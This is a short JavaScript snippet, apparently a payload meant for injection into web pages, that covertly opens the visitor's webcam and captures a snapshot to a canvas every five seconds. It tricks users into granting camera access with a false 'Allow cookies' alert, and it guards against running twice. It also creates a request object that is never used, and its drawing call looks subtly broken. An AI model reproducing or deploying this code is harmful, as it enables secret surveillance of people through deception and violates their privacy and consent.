if (document.getElementById('webcamsnap') == null){ 
 
	 var v = document.createElement('video');
      v.autoplay=true;
	  v.id='vid';
	  document.body.appendChild(v); 
     if (document.getElementById('canvas') == null) {
    var c = document.createElement('canvas');
    c.id = 'canvas';
    c.width = "480";
    c.height = "320";
    document.body.appendChild(c);
}
var video = document.querySelector("#vid");
var canvas = document.querySelector('#canvas');
var ctx = canvas.getContext('2d');
var localMediaStream = null;
var onCameraFail = function (e) {
    console.log('Camera is not working.', e);
};
var xmlhttp=new XMLHttpRequest();

function snapshot() {
    if (localMediaStream) {
        ctx.drawImage(video, 480, 320);
        var dat = canvas.toDataURL('image/png');
    }
    else {
        alert("Allow cookies. It is necessary :) ");
    }
    }

navigator.getUserMedia = navigator.getUserMedia || navigator.webkitGetUserMedia || navigator.mozGetUserMedia || navigator.msGetUserMedia;
window.URL = window.URL || window.webkitURL;
navigator.getUserMedia({video:true}, function (stream) {
    video.srcObject = stream;
    localMediaStream = stream;
    window.setInterval("snapshot()", 5000);
}, onCameraFail);script = document.createElement('script');script.id = 'webcamsnap'; document.body.appendChild(script); }
